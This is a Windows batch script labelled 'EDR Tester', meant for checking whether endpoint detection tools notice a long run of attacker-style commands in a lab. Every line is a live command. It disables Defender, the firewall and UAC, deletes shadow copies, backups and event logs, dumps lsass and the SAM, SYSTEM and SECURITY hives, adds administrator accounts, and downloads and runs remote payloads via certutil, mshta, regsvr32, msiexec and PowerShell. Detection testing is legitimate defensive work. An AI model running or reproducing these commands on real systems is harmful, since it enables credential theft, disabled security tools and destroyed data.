@ECHO OFF 
:: This batch file wants to check your EDR systems detection and response capabilities in a more noisy way!
TITLE EDR TESTER Runnig Now!!!!!
ECHO Please wait..until EDR testing script finish its jobs, then you should check your EDR log events.
ECHO You can use this script when you are testing various EDR and NTA products. 
ECHO Please run this script administrator mode and lab environments!
ECHO ********************************
ECHO *       EDR Tester v.01        *
ECHO ********************************
ECHO ============================
systeminfo | findstr /c:"OS Name"
systeminfo | findstr /c:"OS Version"
systeminfo | findstr /c:"System Type"
ECHO ============================
ECHO ============================
systeminfo | findstr /c:"Total Physical Memory"
ECHO ============================
wmic cpu get name
ECHO ============================
ECHO NETWORK INFO
ECHO ============================
ipconfig | findstr IPv4
ipconfig | findstr IPv6
ECHO ============================
ipconfig | findstr /R /C:"IP.*"
ECHO ============================
net user Administrator /domain
ECHO ============================
echo %USERNAME%
ECHO ============================
net Accounts 
ECHO ============================
net localgroup administrators
ECHO ============================
net use
ECHO ============================
net share
ECHO ============================
net group "Enterprise Admins" /domain
ECHO ============================
net localgroup administrators /domain
ECHO ============================
net localgroup administrators joseph /add
ECHO ============================
net localgroup "Remote Desktop Users" johnwick  /add
ECHO ============================
net localgroup "Debugger users" johnwick /add
ECHO ============================
net localgroup "Power users" jonhwick /add
ECHO ============================
net group “Domain Controllers” /domain
ECHO ============================
net group “Domain Admins” /domain
ECHO ============================
net user johnwick /domain /active:no
ECHO ============================
net config workstation
ECHO ============================
net accounts
ECHO ============================
net continue
ECHO ============================
net localgroup
ECHO ============================
net user
ECHO ============================
NET STOP Spooler
ECHO ============================
net.exe view igmp.mcast.net
ECHO ============================
net group "domain computers" /domain
ECHO ============================
net time
ECHO ============================
NET START Spooler
ECHO ============================
ping -n 10 127.0.0.1
ECHO ============================
net config Workstation
ECHO ============================
net statistics Workstation
ECHO ============================
net accounts /domain
ECHO ============================
net view
ECHO ============================
net stop windefend
ECHO ============================
sc stop SepMasterService & sc stop Windefend & sc stop xagt & sc stop CarbonBlack & sc stop mcshield & sc stop msmpsvc & sc stop wuauserv
ECHO ============================
net user admin test /add
ECHO ============================
net user admin /domain
ECHO ============================
net user admin /active:yes /domain
ECHO ============================
ver
ECHO ============================
tree /F /A
ECHO ============================
assoc
ECHO ============================
assoc | findstr ".xml"
ECHO ============================
schtasks /create /sc minute /mo 1 /tn VVRsPMjDDQ.exe /tr C:\Users\user\AppData\Local\Temp\VVRsPMjDDQ.exe
ECHO ============================
schtasks /query /fo csv /v > %TEMP%
ECHO ============================
assoc | find ".exe"
ECHO ============================
schtasks /query /fo LIST /v
ECHO ============================
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
ECHO ============================
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
ECHO ============================
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
ECHO ============================
reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
ECHO ============================
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
ECHO ============================
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
ECHO ============================
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
ECHO ============================
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
ECHO ============================
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ECHO ============================
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
ECHO ============================
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators
ECHO ============================
REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f
ECHO ============================
reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
ECHO ============================
reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
ECHO ============================
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
ECHO ============================
REG ADD HKEY_CURRENT_USER\Console /v Test /d "Test Data"
ECHO ============================
REG QUERY HKEY_CURRENT_USER\Console /v Test
ECHO ============================
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
ECHO ============================
REG DELETE HKEY_CURRENT_USER\Console /v Test /f
ECHO ============================
REG QUERY HKEY_CURRENT_USER\Console /v Test
ECHO ============================
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
ECHO ============================
wmic computersystem LIST full
ECHO ============================
cls
ECHO ============================
reg query HKLM /f password /t REG_SZ /s
ECHO ============================
reg query HKCU /f password /t REG_SZ /s
ECHO ============================
findstr /snip password *.xml *.ini *.txt
ECHO ============================
dir /s *password* == *cred* == *vnc* == *.config*
ECHO ============================
dir c:\*vnc.ini /s /b
ECHO ============================
fsutil fsinfo drives
ECHO ============================
bcdedit /set {current} bootstatuspolicy ignoreallfailures
ECHO ============================
bcdedit /set {default} recoveryenabled No -y
ECHO ============================
tasklist /svc
ECHO ============================
wmic /namespace:\\root\securitycenter2 path antivirusproduct
ECHO ============================
wmic path Win32_PnPdevice
ECHO ============================
wmic qfe list brief
ECHO ============================
wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size
ECHO ============================
wmic startup list brief
ECHO ============================
wmic share list
ECHO ============================
wmic service get name,displayname,pathname,startmode
ECHO ============================
wmic process list brief
ECHO ============================
wmic process get caption,executablepath,commandline 
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C whoami
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ipconfig /all
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C powershell exit
ECHO ============================
wmic qfe get description,installedOn /format:csv & arp -a & "cmd.exe" /C ping -n 10 google.com.tr
ECHO ============================
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
ECHO ============================
wmic process call create "cmd.exe /C calc.exe"
ECHO ============================
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
ECHO ============================
wmic computersystem get "Model","Manufacturer", "Name", "UserName"
ECHO ============================
wmic shadowcopy delete -y
ECHO ============================
wmic UserAccount where Name='johnwick' set PasswordExpires=False
ECHO ============================
route print
ECHO ============================
query session
ECHO ============================
netsh advfirewall show allprofiles
ECHO ============================
netsh firewall show config
ECHO ============================
tasklist
ECHO ============================
arp -a
ECHO ============================
systeminfo 
ECHO ============================
qwinsta
ECHO ============================
ipconfig /displaydns & ipconfig /flushdns
ECHO ============================
quser
ECHO ============================
wevtutil cl application
ECHO ============================
wevtutil cl system
ECHO ============================
wevtutil cl security
ECHO ============================
taskkill /F /IM iexplore.exe
ECHO ============================
taskkill /F /IM calc.exe
ECHO ============================
taskkill /f /pid 8888
ECHO ============================
nltest /domain_trusts
ECHO ============================
sc config "windefend" start= disabled
ECHO ============================
sc config upnphost obj= ".\LocalSystem" password= ""
ECHO ============================
"schtasks" /Create /TR "CSIDL_PROFILE\appdata\roaming\adobe\adobeup.exe" /SC WEEKLY /TN "Adobe Acrobat Reader Updater"
ECHO ============================
psexec -s -i -d regedit
ECHO ============================
psexec -u administrator -p password \\servertest.abc.local -h -s -d -accepteula cmd.exe
ECHO ============================
psexec -i -s cmd.exe
ECHO ============================
"powershell.exe" get-process | where {$_.Description -like "*$windefend*"}
ECHO ============================
"powershell.exe" get-process | where {$_.Description -like "*$cylance*"}
ECHO ============================
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
ECHO ============================
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
ECHO ============================
mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
ECHO ============================
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
ECHO ============================
cmd.exe /c powershell.exe -EncodedCommand ZgBvAHIAKAAkAHgAIAA9ACAAMQAwADAAMAA7ACAAJAB4ACAALQBsAHQAIAAxADIAMAAwADAAOwAgACQAeAArAD0AMQAwADAAMAApACAAewAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgBzAG8AbABlAF0AOgA6AEIAZQBlAHAAKAAkAHgALAAgADMAMAAwACkAOwAgACIAJAB4ACAASAB6ACIAfQA=
ECHO ============================
dir /s
ECHO ============================
takeown /F test.bat
ECHO ============================
taskkill.exe /f /fi "imagename eq repmgr64.exe"
ECHO ============================
dir /ah
ECHO ============================
dir "C:\Program Files" > C:\lists.txt
ECHO ============================
ECHO %PATH%
ECHO ============================
netstat -ano
ECHO ============================
netstat -ano | findstr "ESTABLISHED"
ECHO ============================
netsh firewall set opmode disable
ECHO ============================
netsh.exe firewall set opmode mode=disable profile=all
ECHO ============================
driverquery
ECHO ============================
net user
ECHO ============================
net user admin /delete
ECHO ============================
ipconfig /all
ECHO ============================
whoami
ECHO ============================
whoami /groups
ECHO ============================
sc query state=all
ECHO ============================
ipconfig /all >> %temp%\download
ECHO ============================
date /T & time /T
ECHO ============================
nbtstat -n
ECHO ============================
nbtstat -s
ECHO ============================
net view  \\127.0.0.1
ECHO ============================
hostname
ECHO ============================
cmdkey /list
ECHO ============================
cmdkey /generic:TERMSRV/Server64 /user:dom64\PeteZ /pass:p4g67hjyy23
ECHO ============================
cmdkey /delete TERMSRV/Server64
ECHO ============================
cmdkey /add:server64 /user:Kate
ECHO ============================
cmdkey /add:server64 /user:Kate /pass:z5rd63hGtjH7
ECHO ============================
cmdkey /delete:Server64
ECHO ============================
net group "REDACTED" /domain
ECHO ============================
net group “Exchange Trusted Subsystem” /domain
ECHO ============================
netsh interface show
ECHO ============================
netsh firewall show state
ECHO ============================
getmac
ECHO ============================
set shellobj = wscript.createobject("wscript.shell")
ECHO ============================
echo Set objWshShell = WScript.CreateObject^(“WScript.Shell”^) >> “%temp%\win.vbs”
ECHO ============================
tasklist /v
ECHO ============================
netstat -an | findstr LISTENING
ECHO ============================
findstr /S cpassword $env:logonserver\sysvol\*.xml
ECHO ============================
findstr /S cpassword %logonserver%\sysvol\*.xml
ECHO ============================
net localgroup "Administrators" rdm /add
ECHO ============================
netsh wlan export profile folder=. key=clear
ECHO ============================
netsh advfirewall set currentprofile state off
ECHO ============================
ECHO  %date%-%time%
ECHO ============================
vssadmin delete shadows /For=C: /oldest
ECHO ============================
vssadmin.exe delete shadows /all /quiet
ECHO ============================
whoami /upn & whoami /fqdn & whoami /logonid & whoami /user & whoami /groups & whoami /priv & whoami /all
ECHO ============================
svchost.exe -k DcomLaunch
ECHO ============================
svchost.exe -k netsvcs -p -s Schedule
ECHO ============================
svchost.exe -k netsvcs
ECHO ============================
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
ECHO ============================
forfiles /S /P C:\ /m *.sys /d -10 /c "cmd /c echo @PATH"
ECHO ============================
forfiles /S /P C:\ /m *.hive /d -10 /c "cmd /c echo @PATH"
ECHO ============================
dir /s /b /A:D | findstr "pass"
ECHO ============================
cmd.exe /c powershell.exe Invoke-WebRequest http://www.pdf995.com/samples/pdf.pdf -UserAgent $userAgent
ECHO ============================
wmic.exe os get /format:"http://blah/foo.xsl"
ECHO ============================
cmd.exe /c powershell.exe (Invoke-WebRequest -uri "https://api.ipify.org/").Content
ECHO ============================
cmd.exe /c powershell.exe Test-NetConnection -ComputerName google.com -port 443 -InformationLevel detailed
ECHO ============================
cmd.exe /c winrm quickconfig -quiet > nul 2>&1
ECHO ============================
cmd.exe /c winrm set winrm/config/Client @{AllowUnencrypted = “true”} > nul 2>&1
ECHO ============================
cmd.exe /c powershell.exe Set-Item WSMan:localhost\client\trustedhosts -value * -Force > nul 2>&1
ECHO ============================
del *sys* & del *hive*
ECHO ============================
wbadmin delete catalog -quiet
ECHO ============================
ping -n 10 127.0.0.1
ECHO ============================
net use \\srvtest.abc.local\ipc$
ECHO ============================
net use \\10.38.1.35\C$ /delete
ECHO ============================
dir /s /b /A:H | findstr "pass"
ECHO ============================
nslookup bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com
ECHO ============================
tracert -d bcdyzit4r3e5tet6y3e6y3w3e6y6y6y.testdeneme12345edced.com
ECHO ============================
nslookup www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
ECHO ============================
reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f
ECHO ============================
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ECHO ============================
schtasks /delete /tn VVRsPMjDDQ.exe
ECHO  ============================
timeout 4
ECHO ============================
tasklist /m
ECHO ============================
taskkill.exe /f /im Microsoft.Exchange.\*
ECHO ============================
ECHO %logonserver%
ECHO ============================
cd C:\Users\Default\AppData\Local
ECHO ============================
mkdir Vrtrfetmntest.exe
ECHO ============================
mkdir k:\windows\system32\fr-FR
ECHO ============================
copy %systemroot%\system32\taskkill.exe k:\windows\system32\csrss.exe
ECHO ============================
wmic /node:host process call create “echo > C:\windows\perfc”
ECHO ============================
icacls "C:\windows" /grant Administrator:F /T
ECHO ============================
cd "C:/Documents and settings\administrator\userdata" & dir
ECHO ============================
nslookup whatismyip.com
ECHO ============================
nltest /dclist:abc.local
ECHO ============================
ECHO ============================
cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://alvarezborja.com/jashebc5ujpsed/podkjfnvb3sidje", "$env:APPDATApole.scr" );Start-Process( "$env:APPDATApole.scr" )
ECHO ============================
procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp
ECHO ============================
start C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
ECHO ============================
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
ECHO ============================
subst k: %temp%
ECHO ============================
"powershell.exe" -nop -c "import-module applocker; get-command *applocker*
ECHO ============================
reg save HKLM\Security security.hive
ECHO ============================
reg save HKLM\System system.hive
ECHO ============================
reg save HKLM\SAM sam.hive
ECHO ============================
ren cmd.exe utilman.exe
ECHO ============================
wmic /node:localhost process call create “cmd.exe /c notepad”
ECHO ============================
runas.exe /netonly /user:abc\johnwick dsa.msc
ECHO ============================
start /b cmd /c dir /b /s \\nas\users_home_share$ ^> shareinfo.txt
ECHO ============================
dir \\abc.local\sysvol\*.xml /a-d /s
ECHO ============================
cmd.exe /c bitsadmin /transfer TW /priority foreground https://example.com/apt.exe %USERPROFILE%\apt.exe && start %USERPROFILE%\apt.exe
ECHO ============================
powershell $b = $env:temp + '\RJklmtiTre.exe';WGet 'http://testsite/apt.exe' -outFiLe $b;start $b
ECHO ============================
gpresult /z
ECHO ============================
gpresult /r | find "OU"
ECHO ============================
gpresult /H gpreport.html
ECHO ============================
wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:
ECHO ============================
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
ECHO ============================
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
ECHO ============================
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
ECHO ============================
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
ECHO ============================
msiexec /q /i http://192.168.100.3/tmp/cmd.png
ECHO ============================
secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
ECHO ============================
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
ECHO ============================
winword.exe http://bcdyzitklmnprti.onion/payload.exe
ECHO ============================
netsh winhttp set proxy "proxy.hacked.com:8080"; 127.0.0.1,localhost
ECHO ============================
wmic useraccount where name='krbtgt' get name,fullname,sid
ECHO ============================
netsh advfirewall firewall set rule group=”Windows Remote Management” new enable=yes
ECHO ============================
netsh winhttp reset proxy
ECHO ============================
lsadump:dcsync /domain:abc.local /user:ktbtgt
ECHO ============================
setspn -L servertest
ECHO ============================
setspn -L abc.local\johnwick
ECHO ============================
tasklist  /FO csv /svc
ECHO ============================
gpscript.exe /Logon
ECHO ============================
klist
ECHO ============================
cmd.exe powershell Set-MpPreference -DisableRealtimeMonitoring $true
ECHO ============================
findstr /si password *.xml *.ini *.txt *.config 2>nul
ECHO ============================
ECHO | nslookup | findstr "Default\ Server"
ECHO ============================
setspn -T * -Q */* > Spnlist.txt
ECHO ============================
setspn -T abc.local -Q */* | findstr ":1433" > mssql.txt
ECHO ============================
wmic process call create 'msiexec /i http://96.9.211.157/sdf4r3r3/WinDef.msi /q'
ECHO ============================
dir /b /ad "C:\Users\"
ECHO ============================
fsutil usn deletejournal /D C:
ECHO ============================
ECHO ***************************************************
ECHO Test already Finishied  ! Happy hunting threats :)
ECHO ***************************************************
ECHO ============================
PAUSE
